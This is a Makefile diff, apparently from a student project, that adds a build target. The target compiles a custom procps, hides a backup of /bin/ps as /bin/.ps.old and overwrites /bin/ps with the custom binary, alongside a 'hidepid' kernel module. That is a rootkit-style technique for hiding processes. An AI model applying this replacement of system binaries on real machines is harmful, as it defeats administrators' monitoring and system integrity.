@@ -3,19 +3,24 @@
 CC = gcc
 CFLAGS_APP = -Wall -ansi -pthread -g $(PNAME).c -o $(PNAME)
 PNAME = proj01
-obj-m += hide_pid.o
+obj-m += hidepid.o
+PROCPS_PATH = procps/
+PS_PATH = /bin/ps
+PS_BACKUP_PATH = /bin/.ps.old
+PS_COMPILED_PATH = ps/ps
 
-
-all: $(PNAME).c
+build: $(PNAME).c
 	$(CC) $(CFLAGS_APP)
-	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+	cd $(PROCPS_PATH);make;cp $(PS_PATH) $(PS_BACKUP_PATH);cp $(PS_COMPILED_PATH) $(PS_PATH)
+	
+restore: $(PNAME).c
+	mv $(PS_BACKUP_PATH) $(PS_PATH)
 
-app:
-	$(CC) $(CFLAGS_APP)
-
-module:
-	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+#module:
+#	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 
 clean: $(PNAME).c
 	rm -f $(PNAME)
-	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+	cd $(PROCPS_PATH);make clean
+	mv $(PS_BACKUP_PATH) $(PS_PATH)
+	
